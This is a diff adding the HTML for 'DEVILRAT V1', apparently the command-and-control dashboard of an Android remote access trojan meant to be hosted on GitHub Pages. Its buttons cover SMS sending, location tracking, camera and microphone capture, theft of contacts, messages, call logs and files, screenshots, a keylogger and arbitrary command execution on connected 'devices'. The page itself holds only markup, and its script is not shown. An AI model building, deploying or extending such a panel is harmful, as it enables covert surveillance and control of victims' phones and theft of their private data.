@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>👹 DEVILRAT V1 - GitHub Pages</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>👹</text></svg>">
+</head>
+<body>
+    <div class="devil-header">
+        <div class="devil-title">👹 DEVILRAT V1</div>
+        <div class="devil-subtitle">GITHUB PAGES DEPLOYMENT | KEGELAPAN ABADI</div>
+        <div class="domain-display" id="domainDisplay"></div>
+    </div>
+
+    <div class="stats-container">
+        <div class="stat-card">
+            <div class="stat-value" id="deviceCount">0</div>
+            <div class="stat-label">DEVICES</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="onlineCount">0</div>
+            <div class="stat-label">ONLINE</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="commandCount">0</div>
+            <div class="stat-label">COMMANDS</div>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div class="panel-section">
+            <h2>📱 CONNECTED DEVICES</h2>
+            <div class="device-list" id="deviceList">
+                <!-- Devices will be loaded here -->
+            </div>
+            <button class="btn-refresh" onclick="loadDevices()">🔄 REFRESH DEVICES</button>
+        </div>
+
+        <div class="panel-section">
+            <h2>⚡ QUICK COMMANDS</h2>
+            <div class="command-grid">
+                <button class="cmd-btn" data-command="sms">📱 SEND SMS</button>
+                <button class="cmd-btn" data-command="location">📍 GET LOCATION</button>
+                <button class="cmd-btn" data-command="camera">📸 CAMERA</button>
+                <button class="cmd-btn" data-command="mic">🎤 MICROPHONE</button>
+                <button class="cmd-btn" data-command="contacts">📒 CONTACTS</button>
+                <button class="cmd-btn" data-command="messages">💬 MESSAGES</button>
+                <button class="cmd-btn" data-command="calls">📞 CALL LOGS</button>
+                <button class="cmd-btn" data-command="files">📁 FILES</button>
+                <button class="cmd-btn" data-command="toast">💬 SHOW TOAST</button>
+                <button class="cmd-btn" data-command="vibrate">📳 VIBRATE</button>
+                <button class="cmd-btn" data-command="screenshot">🖼️ SCREENSHOT</button>
+                <button class="cmd-btn" data-command="keylogger">⌨️ KEYLOGGER</button>
+            </div>
+        </div>
+
+        <div class="panel-section">
+            <h2>🔧 ADVANCED CONTROL</h2>
+            <div class="advanced-controls">
+                <div class="input-group">
+                    <input type="text" id="customCommand" placeholder="Enter custom command..." class="input-field">
+                    <button class="btn-execute" onclick="executeCustomCommand()">EXECUTE</button>
+                </div>
+                <div class="input-group">
+                    <textarea id="commandParams" placeholder="Parameters (JSON format)..." class="textarea-field"></textarea>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel-section">
+            <h2>📊 SYSTEM LOGS</h2>
+            <div class="logs-container">
+                <div class="log-header">
+                    <span>TIME</span>
+                    <span>DEVICE</span>
+                    <span>COMMAND</span>
+                    <span>STATUS</span>
+                </div>
+                <div class="logs-content" id="logsContent">
+                    <!-- Logs will appear here -->
+                </div>
+            </div>
+            <button class="btn-clear" onclick="clearLogs()">🧹 CLEAR LOGS</button>
+        </div>
+    </div>
+
+    <!-- Command Modal -->
+    <div class="modal" id="commandModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modalTitle">COMMAND PANEL</h3>
+                <button class="modal-close" onclick="closeModal()">×</button>
+            </div>
+            <div class="modal-body" id="modalBody">
+                <!-- Dynamic content -->
+            </div>
+            <div class="modal-footer">
+                <button class="btn-cancel" onclick="closeModal()">CANCEL</button>
+                <button class="btn-execute" id="modalExecute">EXECUTE</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Device Select Modal -->
+    <div class="modal" id="deviceModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>SELECT DEVICE</h3>
+                <button class="modal-close" onclick="closeDeviceModal()">×</button>
+            </div>
+            <div class="modal-body">
+                <div id="deviceSelectList"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-info">
+            <span>👹 DEVILRAT V1 | GITHUB PAGES EDITION</span>
+            <span> | </span>
+            <span id="connectionStatus">🟢 CONNECTED</span>
+            <span> | </span>
+            <span id="currentTime">00:00:00</span>
+        </div>
+        <div class="footer-actions">
+            <button class="footer-btn" onclick="toggleTheme()">🌙 THEME</button>
+            <button class="footer-btn" onclick="exportLogs()">📥 EXPORT</button>
+            <button class="footer-btn" onclick="showInfo()">ℹ️ INFO</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+              </html>
